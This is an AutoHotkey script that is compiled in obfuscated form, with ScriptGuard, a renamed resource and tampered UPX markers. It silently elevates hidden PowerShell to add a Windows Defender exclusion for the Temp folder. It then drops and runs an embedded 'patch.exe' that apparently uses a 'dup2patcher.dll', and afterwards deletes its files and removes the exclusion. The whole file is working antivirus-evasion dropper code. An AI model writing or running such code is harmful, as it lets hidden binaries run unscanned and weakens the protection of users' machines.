#Include ScriptGuard1.ahk    ; Can adjust for location of ScriptGuard1.ahk
;@Ahk2Exe-Obey U_Bin,= "%A_BasePath~^.+\.%" = "bin" ? "Cont" : "Nop" ; .bin?
;@Ahk2Exe-Obey U_au, = "%A_IsUnicode%" ? 2 : 1 ; Base file ANSI or Unicode?
;@Ahk2Exe-PostExec "BinMod.exe" "%A_WorkFileName%"
;@Ahk2Exe-%U_Bin%  "1%U_au%2.>AUTOHOTKEY SCRIPT<. RANDOM"
;@Ahk2Exe-Cont  "%U_au%.AutoHotkeyGUI.RANDOM"
;@Ahk2Exe-Cont  /ScriptGuard2  ; or /ScriptGuard2pss if required
;@Ahk2Exe-PostExec "BinMod.exe" "%A_WorkFileName%" "11.UPX." "1.UPX!.", 2
;@Ahk2Exe-UpdateManifest 0 ,.

#NoTrayIcon
#SingleInstance Ignore

; Variables
exclude_dir	:= A_Temp
temp_patch	:= A_Temp . '\' . RegExReplace(A_ScriptName, 'i)\.ahk$', '.exe')
original_dll	:= A_Temp . '\dup2patcher.dll'
temp_dll	:= RegExReplace(temp_patch, 'i)\.exe$', '.dll')

; Exclude temp folder from Windows Defender & Wait till exclusion is registered
RunWait '*RunAs "powershell.exe" "Add-MpPreference -ExclusionPath `'' . exclude_dir . '`'"', , 'Hide'
Loop {
	exclusion_exists := not(RunWait('*RunAs "powershell.exe" "(Get-MpPreference  | Select-Object -ExpandProperty ExclusionPath | Where-Object {$_ -eq `'' . exclude_dir . '`'})[0]"', , 'Hide'))
} Until exclusion_exists

; Move temp patch to temp folder & Run it
FileInstall 'patch.exe', temp_patch, true
Run '"' . temp_patch . '" /startupworkdir "' . A_WorkingDir . '"', , , &temp_process_pid

; Wait for temp patch to open & Rename associated dll
WinWait 'ahk_pid ' . temp_process_pid
FileMove original_dll, temp_dll, true

; Wait for temp patch to close & Delete temp files
WinWaitClose 'ahk_pid ' . temp_process_pid
FileDelete temp_patch 
FileDelete temp_dll

; Remove Windows Defender exclusion
RunWait '*RunAs "powershell.exe" "Remove-MpPreference -ExclusionPath `'' . exclude_dir . '`'"', , 'Hide'